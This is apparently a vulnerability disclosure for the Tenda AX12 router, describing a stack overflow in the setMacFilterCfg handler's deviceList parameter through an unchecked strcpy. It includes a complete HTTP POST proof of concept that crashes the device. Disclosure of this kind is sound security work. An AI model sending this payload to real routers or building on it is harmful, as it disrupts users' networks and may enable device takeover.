## Vulnerability description

Affect device：[Tenda-AX12 V22.03.01.46_CN](https://www.tenda.com.cn/download/detail-3621.html)

Vulnerability Type: Stack overflow

Impact: Denial of Service(DoS)，May be able to execute commands

## Vulnerability cause

In the `/goform/setMacFilterCfg` interface, the `deviceList` parameter and the `strcpy` function passed through it do not limit the length, which will cause stack overflow and achieve the effect of a DoS denial of service attack.

in the `sub_42F69C`

![image-20240629102810754](README/image-20240629102810754.png)

Transferring parameters to the corresponding processing position

![image-20240629102928207](README/image-20240629102928207.png)

The program vulnerability is here `sub_42E410` `strcpy`

![image-20240629103026161](README/image-20240629103026161.png)

No length check conducted

## POC

Poc of Denial of Service(DoS):

```
POST /goform/setMacFilterCfg HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 10
Origin: http://192.168.0.1
Connection: close
Cookie: password=xxxxxxxxxx
Referer: http://192.168.0.1/main.html

macFilterType=black&deviceList=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%0d
```

